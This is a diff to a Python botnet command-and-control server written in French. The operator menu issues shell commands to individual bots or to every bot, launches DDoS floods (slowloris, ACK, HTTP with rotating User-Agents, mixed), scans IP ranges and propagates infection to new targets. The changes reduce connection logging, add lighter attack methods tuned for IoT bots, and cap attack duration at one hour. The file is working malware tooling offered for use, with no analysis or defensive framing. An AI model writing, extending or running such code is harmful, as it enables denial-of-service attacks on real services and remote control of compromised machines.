@@ -27,7 +27,9 @@ active_ddos = 0
 def handle_bot(client_socket, address):
     """Gère la connexion d'un bot individuel"""
     global total_infections, active_ddos
-    print(f"[+] Nouvelle connexion de {address[0]}:{address[1]}")
+    # Réduire les logs de connexion
+    if len(connected_bots) % 10 == 0:  # Log toutes les 10 connexions
+        print(f"[+] {len(connected_bots)} bots connectés - Dernier: {address[0]}")
     
     # Informations sur le bot
     bot_info = {
@@ -177,10 +179,8 @@ def broadcast_command(command):
 def command_interface():
     """Interface utilisateur pour contrôler les bots"""
     while True:
-        print("\n===== BOTNET C2 CONTROL PANEL =====")
-        print(f"Bots connectés: {len(connected_bots)} | Infections totales: {total_infections} | Commandes exécutées: {total_commands} | DDoS actifs: {active_ddos}")
-        print("\nCommandes disponibles:")
-        print("1. list - Liste les bots connectés")
+        print("\nCommandes disponibles :")
+        print("1. list - Liste tous les bots connectés")
         print("2. info <id> - Affiche les informations détaillées d'un bot")
         print("3. cmd <id> <commande> - Exécute une commande shell sur un bot spécifique")
         print("4. broadcast <commande> - Exécute une commande sur tous les bots")
@@ -188,12 +188,14 @@ def command_interface():
         print("6. ddos-all <cible> <durée> [méthode] - Lance une attaque DDoS avec tous les bots")
         print("7. scan <id> <plage> - Scanner une plage d'adresses IP")
         print("8. propagate <id> <cible> - Tente de se propager vers une cible")
-        print("9. ping <id> - Vérifie si un bot est toujours connecté")
-        print("10. ping-all - Vérifie tous les bots")
-        print("11. kill <id> - Déconnecte un bot")
-        print("12. exit - Arrête le serveur C2")
-        print("13. help - Affiche l'aide")
-        print("\nMéthodes DDoS disponibles: tcp, udp, http, syn")
+        print("9. clear - Efface l'écran")
+        print("10. exit - Arrête le serveur C2")
+        print("\nMéthodes DDoS disponibles:")
+        print("- slowloris : Garde les connexions ouvertes (optimal pour IoT)")
+        print("- ack      : Flood de paquets ACK (très léger)")
+        print("- http     : Flood HTTP avec rotation d'User-Agents")
+        print("- mix      : Mélange d'attaques légères")
+        print(f"\nBots connectés: {len(connected_bots)} | Attaques actives: {active_ddos}")
         
         cmd = input("\n> ")
         cmd_parts = cmd.strip().split()
@@ -246,25 +248,40 @@ def command_interface():
             try:
                 bot_index = int(cmd_parts[1])
                 target = cmd_parts[2]
-                duration = cmd_parts[3]
-                method = cmd_parts[4] if len(cmd_parts) > 4 else "tcp"
+                duration = int(cmd_parts[3])
+                method = cmd_parts[4] if len(cmd_parts) > 4 else "mix"
+                
+                if duration > 3600:  # Max 1 heure
+                    print("[!] Durée maximum autorisée: 3600 secondes (1 heure)")
+                    continue
+                    
                 command = f"DDOS {target} {duration} {method}"
                 send_command_to_bot(bot_index, command)
-                print(f"[+] Attaque {method.upper()} lancée contre {target} pour {duration} secondes")
+                print(f"[+] Bot {bot_index} lance une attaque {method} contre {target}")
+                
             except ValueError:
                 print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
-        
+                
         elif cmd_parts[0] == "ddos-all" and len(cmd_parts) > 2:
             try:
                 target = cmd_parts[1]
-                duration = cmd_parts[2]
-                method = cmd_parts[3] if len(cmd_parts) > 3 else "tcp"
+                duration = int(cmd_parts[2])
+                method = cmd_parts[3] if len(cmd_parts) > 3 else "mix"
+                
+                if duration > 3600:
+                    print("[!] Durée maximum autorisée: 3600 secondes (1 heure)")
+                    continue
+                    
                 command = f"DDOS {target} {duration} {method}"
-                print(f"[*] Lancement d'une attaque DDoS {method.upper()} contre {target} pour {duration} secondes avec tous les bots")
+                active_bots = len(connected_bots)
                 broadcast_command(command)
+                print(f"[+] Attaque {method} lancée avec {active_bots} bots contre {target}")
+                
             except ValueError:
                 print("[!] Format invalide. Utilisez: ddos-all <cible> <durée> [méthode]")
-                print("[*] Méthodes disponibles: tcp, udp, http, syn")
+                
+        elif cmd_parts[0] == "clear":
+            os.system('cls' if os.name == 'nt' else 'clear')
         
         elif cmd_parts[0] == "scan" and len(cmd_parts) > 2:
             try:
